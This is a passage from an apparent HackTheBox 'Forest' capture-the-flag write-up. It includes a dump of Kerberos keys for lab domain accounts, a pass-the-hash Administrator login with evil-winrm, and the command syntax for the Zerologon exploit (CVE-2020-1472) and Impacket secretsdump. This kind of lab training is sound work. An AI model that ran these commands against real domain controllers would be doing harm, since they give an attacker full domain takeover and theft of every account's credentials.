htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
FOREST$:aes256-cts-hmac-sha1-96:cc920f9f7769e0428c6c385f247400f557bcb76ff8752b589e6c4e2a179110e9
FOREST$:aes128-cts-hmac-sha1-96:30a27124a0d2741893dacf46bca17b18
FOREST$:des-cbc-md5:730d104a70293402
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c1697512
```
We use this exploit in conjunction with `secretsdump` from Impacket to dump the hashes of all the users on the machine including `Administrator`

```zsh
┌──(kali㉿kali)-[~/…/forest/exploit/zerologon/CVE-2020-1472]
└─$ evil-winrm -i FOREST.htb.local -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir ../Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        10/7/2026  11:55 AM             34 root.txt
```
As you can see, we successfully login via pass-the-hash as the Administrator with the hashes we stole from zerologon. Pwned even before initial access. `user.txt` can be found inside `C:\Users\svc-alfresco\Desktop`. If you remember, that account was the only account besides the Administrator that was inside the Remote Management Users group which is an indicator that in this CTF style environment that this is the only other user that can get an active shell session on the server. (this is a bit meta gamey but I believe knowing who can get a shell via that group is still useful info for windows environments).


## Final Thoughts
>[!Takeaways]
>- Always enumerate zerologon and printnightmare as part of initial enumeration
>- Make sure your syntax for zerologon is correct `exploit.py <HOSTNAME> <IP>` & `impacket-secretsdump -dc-ip <IP> -just-dc -no-pass 'HOSTNAME$'@IP`

